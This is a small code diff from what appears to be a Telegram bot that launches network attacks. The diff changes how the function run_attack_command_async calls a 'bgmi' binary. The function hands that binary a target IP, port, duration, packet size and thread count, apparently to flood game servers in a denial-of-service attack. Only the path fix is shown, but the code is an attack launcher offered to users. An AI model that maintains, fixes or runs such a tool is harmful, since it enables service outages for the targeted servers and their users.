@@ -291,7 +291,7 @@ def bgmi_command(message):
 
 async def run_attack_command_async(target_ip, target_port, duration, user_duration, user_name):
     try:
-        command = f"/bgmi {target_ip} {target_port} {duration} {packet_size} {thread_count}"
+        command = f"./bgmi {target_ip} {target_port} {duration} {packet_size} {thread_count}"
         
         process = await asyncio.create_subprocess_shell(command)
         await process.communicate()
